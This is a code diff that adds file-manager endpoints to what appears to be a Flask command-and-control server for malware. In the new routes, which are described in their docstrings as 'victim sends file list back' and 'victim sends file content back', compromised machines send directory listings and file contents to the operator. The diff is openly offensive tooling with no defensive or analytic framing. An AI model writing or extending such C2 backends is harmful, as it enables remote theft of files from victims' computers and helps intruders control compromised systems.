@@ -865,6 +865,62 @@ def c2_get_responses(uid):
         return jsonify({'responses': resps})
     return jsonify({'responses': []})
 
+# File Manager Endpoints
+C2_FILE_LISTS = {}
+C2_DOWNLOADS = {}
+
+@app.route('/api/c2/get_file_list/<uid>')
+def c2_get_file_list(uid):
+    if uid in C2_FILE_LISTS:
+        file_data = C2_FILE_LISTS[uid]
+        # Clear after reading
+        del C2_FILE_LISTS[uid]
+        return jsonify(file_data)
+    return jsonify({'files': None})
+
+@app.route('/api/c2/get_download/<uid>')
+def c2_get_download(uid):
+    if uid in C2_DOWNLOADS:
+        file_data = C2_DOWNLOADS[uid]
+        # Clear after reading
+        del C2_DOWNLOADS[uid]
+        return jsonify(file_data)
+    return jsonify({'file': None})
+
+@app.route('/api/c2/file_list_response', methods=['POST'])
+def c2_file_list_response():
+    """Victim sends file list back"""
+    data = request.json
+    uid = data.get('uid')
+    files = data.get('files')
+    path = data.get('path')
+    
+    if uid:
+        C2_FILE_LISTS[uid] = {
+            'files': files,
+            'path': path
+        }
+    
+    return jsonify({'status': 'received'})
+
+@app.route('/api/c2/file_download_response', methods=['POST'])
+def c2_file_download_response():
+    """Victim sends file content back"""
+    data = request.json
+    uid = data.get('uid')
+    content = data.get('content')
+    filename = data.get('filename')
+    
+    if uid:
+        C2_DOWNLOADS[uid] = {
+            'file': {
+                'content': content,
+                'filename': filename
+            }
+        }
+    
+    return jsonify({'status': 'received'})
+
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=2525, debug=True)
